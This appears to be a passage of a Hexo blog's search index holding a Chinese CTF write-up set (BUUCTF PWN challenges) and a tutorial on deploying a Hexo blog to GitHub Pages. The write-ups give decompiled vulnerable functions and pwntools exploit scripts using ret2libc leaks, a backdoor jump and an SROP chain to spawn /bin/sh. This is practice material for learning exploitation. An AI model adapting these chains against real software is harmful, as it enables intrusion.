class="hljs-keyword">if</span> ( n32 &gt; <span class="hljs-number">32</span> )<br>    <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;No! That size (%d) is too large!\n&quot;</span>, n32);<br>  printf(<span class="hljs-string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, n32);<br>  get_n(nptr, n32);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, nptr);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 我libcsearh不出来，但是题目给了环境，拿glibc-all-in-one里的2.23来用就行</span><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>fmt = <span class="hljs-number">0x080486F8</span>  <br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) + p(fmt) +p(func_got)<br><br>sla(<span class="hljs-string">&quot;of data!\n&quot;</span>,payload)<br>rl()<br>ru(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(libcPath+<span class="hljs-string">&#x27;libc-2.23-3.so&#x27;</span>)<br><br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>sysAddr,shellStr = LLSysBin(libc,libcBase)<br><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr)+ p(again) + p(shellStr)<br>sl(payload)<br><br></code></pre></td></tr></table></figure><h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a><font style="color:rgb(33, 37, 41);">wustctf2020_getshell</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出+后门</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">24</span>]; // [esp+0h] [ebp-18h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x20u);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = junk(<span class="hljs-number">0x1c</span>) + p(elf.sym[<span class="hljs-string">&#x27;shell&#x27;</span>])<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level3</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出</li><li>Ret2libc</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+0h] [ebp-88h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, 7u);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 毛病（原件是libc-2.19.so），环境得要[OGeek2019]babyrop题目的libc</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x88</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) + p(<span class="hljs-number">1</span>) + p(func_got) + p(<span class="hljs-number">4</span>)<br><br>sla(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sysAddr,shellStr = LLSysBin(libc,libcBase)<br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr) + p(again) + p(shellStr)<br>sla(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><br><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_s_3</font></h1><blockquote><p>考点</p><ul><li>SROP</li><li>栈溢出</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">signed __int64 vuln()<br>&#123;<br>  signed __int64 v0; // rax<br>  char buf[<span class="hljs-number">16</span>]; // [rsp+0h] [rbp-10h] BYREF<br><br>  v0 = sys_read(<span class="hljs-number">0</span>, buf, 0x400uLL);<br>  <span class="hljs-keyword">return</span> sys_write(1u, buf, 0x30uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp（SROP）</span><br><span class="hljs-comment">## 这里注意一个点，记得获取栈地址</span><br><span class="hljs-comment">## 在获取栈地址的时候要记得将本地环境修改到2.27上，不然调试的时候无法实现</span><br><span class="hljs-comment">## 在计算偏移的时候可以利用distance来帮助计算，我这里leak的是[rsp+10]</span><br><span class="hljs-comment">### 想打Ret2syscall----&gt;execve(&#x27;/bin/sh\x00&#x27;,NULL,NULL)，那么就需要解决rdx怎么置零的问题，因为工具没找到rdx的ROPgadget</span><br>rax_ret = <span class="hljs-number">0x04004DA</span><br>syscall_ret = <span class="hljs-number">0x0400517</span><br>again = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><br>payload = junk(<span class="hljs-number">0x10</span>) + p(again)<br>s(payload)<br>r(<span class="hljs-number">0x20</span>)<br>stack_addr = u(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x118</span><br>lgs(<span class="hljs-built_in">hex</span>(stack_addr))<br><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">0x3b</span><br>frame.rdi = stack_addr + <span class="hljs-number">0x118</span><br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br><br>payload = junk(<span class="hljs-number">0x10</span>) + p(rax_ret) + p(syscall_ret) + <span class="hljs-built_in">bytes</span>(frame) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>sl(payload)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Blog-building</title>
    <link href="/Blog-building/"/>
    <url>/Blog-building/</url>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/yaorongke/article/details/119089190">GitHub Pages + Hexo搭建个人博客网站，史上最全教程</a></li><li><a href="https://blog.csdn.net/qq_62928039/article/details/130248518?app_version=6.2.4&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22130248518%22,%22source%22:%22ilovefxr%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">Hexo+GitHub搭建个人博客教程（2023最新版）</a></li><li><a href="https://hexo.fluid-dev.com/docs/start/">Hexo Fuluid</a></li><li><a href="https://www.cnblogs.com/coldchair/p/18034946">Git clone</a></li></ul><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul><li><a href="https://nodejs.cn/">Node.js</a></li><li><a href="https://git-scm.com/">Git</a></li></ul><h1 id="Create-a-personal-Blog"><a href="#Create-a-personal-Blog" class="headerlink" title="Create a personal Blog"></a>Create a personal Blog</h1><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ol><li>创建仓库</li></ol><p><img src="/../Images/image-20250331224141805.png"></p><p><img src="/../Images/image-20250331225020643.png"></p><p><img src="/../Images/image-20250331225104356.png"></p><p><img src="/../Images/image-20250331225337137.png"></p><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><blockquote><p>npm install -g cnpm –registry&#x3D;<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><br>过期的可以试试 npm install -g cnpm –registry&#x3D;<a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a><br>可以理解成替换源，之后都用cnpm来实现</p></blockquote><blockquote><p>cnpm install -g hexo-cli</p></blockquote><blockquote><p>如果已经创建了一个文件夹，那么在这个文件夹下开启git bash</p><p>hexo init</p><p>如果没有</p><p>那么</p><p>hexo init &lt;文件夹名字&gt;</p><blockquote><p>成功后在这个文件夹下会出现许多文件</p></blockquote><p>没成功的话可以去查查，</p><p>我这里是git clone失败，代理到clash去即可</p><blockquote><p>git config –global http.proxy “127.0.0.1:7890”</p></blockquote><blockquote><p>git config –global https.proxy “127.0.0.1:7890”</p></blockquote></blockquote><blockquote><p>cnpm install hexo-deployer-git –save</p></blockquote><p><img src="/../Images/image-20250331225749985.png"></p><h2 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h2><blockquote><p> cd ~&#x2F;.ssh</p></blockquote><blockquote><p>ssh-keygen -t rsa -C ‘***@qq.com’</p><blockquote><p>会在C:\Users\***\.ssh目录下生成两个文件</p></blockquote></blockquote><p><img src="/../Images/image-20250331230322867.png"></p><p><strong>打开.pub文件，复制其内容下来，后边配置要用到</strong></p><p><img src="/../Images/image-20250331230447940.png"></p><p><img src="/../Images/image-20250331230526585.png"></p><p><img src="/../Images/image-20250331230616997.png"></p><p>Add后退出，重新进入目录C:\Users\***\.ssh下创建一个文件叫config，内容填下</p><blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host github<span class="hljs-selector-class">.com</span><br>    Hostname ssh<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.com</span><br>    PreferredAuthentications publickey<br>    IdentityFile ~/.ssh/&lt;生成key的名字&gt;<br>    Port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><blockquote><p>比如我用ssh-keygen -t rsa -C ‘***@qq.com’</p><p>生成的名字叫Blog</p><p>那么就填</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host github<span class="hljs-selector-class">.com</span><br>    Hostname ssh<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.com</span><br>    PreferredAuthentications publickey<br>    IdentityFile ~/.ssh/Blog<br>    Port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure></blockquote></blockquote><p>在hexo初始化的文件夹下打开Git Bash</p><p><img src="/../Images/image-20250331230956862.png"></p><blockquote><p>ssh -T <a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#111;&#109;">git@github.com</a></p><p>yes</p></blockquote><blockquote><p>git config –global user.name “Github的用户名“</p></blockquote><blockquote><p>git config –global user.email “Github的邮箱“</p></blockquote><p>打开hexo初始化下的_config.yml，在最后（如下写入）</p><p><img src="/../Images/image-20250331231748879.png"></p><blockquote><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">    type:</span> git<br><span class="hljs-symbol">    repo:</span> ***<br><span class="hljs-symbol">    branch:</span> main<br></code></pre></td></tr></table></figure><blockquote><p>repo的内容从github上弄</p></blockquote></blockquote><p><img src="/../Images/image-20250331231931730.png"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><code>hexo s</code></p><h2 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h2><p><code>hexo g</code></p><h2 id="部署Github"><a href="#部署Github" class="headerlink" title="部署Github"></a>部署Github</h2><p><code>hexo d</code></p><h2 id="生成文章"><a href="#生成文章" class="headerlink" title="生成文章"></a>生成文章</h2><p><code>hexo new &lt;filename&gt;</code></p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
